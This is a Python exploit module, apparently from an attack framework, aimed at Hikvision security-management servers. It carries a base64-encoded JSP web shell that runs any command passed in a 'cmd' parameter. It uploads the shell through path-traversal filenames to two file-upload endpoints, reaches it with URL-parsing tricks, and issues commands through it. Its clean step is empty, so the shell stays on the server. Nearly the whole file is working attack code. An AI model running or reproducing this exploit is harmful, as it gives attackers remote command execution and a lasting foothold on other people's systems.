import base64
from core.exploit import *

webshell = 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmJlYW5zLkV4cHJlc3Npb24iICU+DQo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIiICU+DQo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uQnVmZmVyZWRSZWFkZXIiICU+DQo8JUAgcGFnZSBpbXBvcnQ9ImphdmEuaW8uSW5wdXRTdHJlYW0iICU+DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgcGFnZUVuY29kaW5nPSJVVEYtOCIgJT4NCjwlDQogIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7DQogIEV4cHJlc3Npb24gZXhwciA9IG5ldyBFeHByZXNzaW9uKFJ1bnRpbWUuZ2V0UnVudGltZSgpLCAiZXhlYyIsIG5ldyBPYmplY3RbXXtjbWR9KTsNCg0KICBQcm9jZXNzIHByb2Nlc3MgPSAoUHJvY2VzcykgZXhwci5nZXRWYWx1ZSgpOw0KICBJbnB1dFN0cmVhbSBpbiA9IHByb2Nlc3MuZ2V0SW5wdXRTdHJlYW0oKTsNCiAgQnVmZmVyZWRSZWFkZXIgYnVmZmVyZWRSZWFkZXIgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKGluKSk7DQogIFN0cmluZyB0bXAgPSBudWxsOw0KICB3aGlsZSgodG1wID0gYnVmZmVyZWRSZWFkZXIucmVhZExpbmUoKSkhPW51bGwpew0KICAgIHJlc3BvbnNlLmdldFdyaXRlcigpLnByaW50bG4odG1wKTsNCiAgfQ0KJT4='

class Hikvision(Exploit):
    def __init__(self, url):
        self.url = url
        self.client = HttpClient(url)
        self.shell_uri = ""

    def upload(self):
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US;q=0.8,en;q=0.7",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a"
        }
        data = (
            '------WebKitFormBoundary9PggsiM755PLa54a\r\n'
            'Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/infox.jsp"\r\n'
            'Content-Type: application/zip\r\n\r\n'
            f'{base64.b64decode(webshell).decode()}\r\n'
            '------WebKitFormBoundary9PggsiM755PLa54a--'
        )
        uri = "/svm/api/external/report"
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200:
            try:
                data = response.json()
                ok = data["code"] and data["msg"] and data["data"]
                self.log("File upload success", "info")
                self.shell_uri = "/portal/ui/login/..;/..;/infox.jsp"
                return ExploitStatus.SUCCESS
            except:
                pass
        
        uri = "/center/api/files;.js"
        data = (
            '------WebKitFormBoundary9PggsiM755PLa54a\r\n'
            'Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/infox.jsp"\r\n'
            'Content-Type: application/zip\r\n\r\n'
            f'{base64.b64decode(webshell).decode()}\r\n'
            '------WebKitFormBoundary9PggsiM755PLa54a--'
        )
        
        response = self.client.request("POST", uri, headers=headers, data=data)
        if response.status_code == 200 and 'webapps/clusterMgr' in response.text:
            self.log("File upload success", "info")
            self.shell_uri = "/clusterMgr/infox.jsp;.js"
            return ExploitStatus.SUCCESS
        
        self.log("File upload failed", "error")
        return ExploitStatus.FAILED


    def attack(self, cmd):
        data = {"cmd": cmd}
        response = self.client.request("POST", self.shell_uri, data=data)
        if response.status_code == 200:
            self.log("Command Execute successfully","info")
            return response.content
        self.log("Command Execute failed","error")
        return b"error"
    
    def clean(self):
        pass

